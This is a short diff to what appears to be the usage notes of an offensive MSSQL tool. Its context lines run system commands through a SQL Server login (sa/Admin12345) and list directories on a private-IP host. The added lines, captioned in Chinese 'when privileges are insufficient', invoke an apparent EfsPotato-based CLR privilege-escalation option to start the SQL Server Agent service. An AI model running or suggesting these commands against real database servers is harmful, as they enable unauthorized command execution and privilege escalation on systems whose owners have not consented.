@@ -184,6 +184,9 @@ nt service\mssqllaunchpad
 mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd10 "whoami >c:\\programdata\\test.txt"
 CreateAndStartJob Command Success!
 
+当权限不足的时候
+mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -cmd3 "clr_efspotato net start SQLSERVERAGENT"
+
 列目录
 mssql-command-tools_Windows_64.exe -s 192.168.3.186 -u sa -p Admin12345 -dir "c:\\programdata"
 subdirectory    depth   file
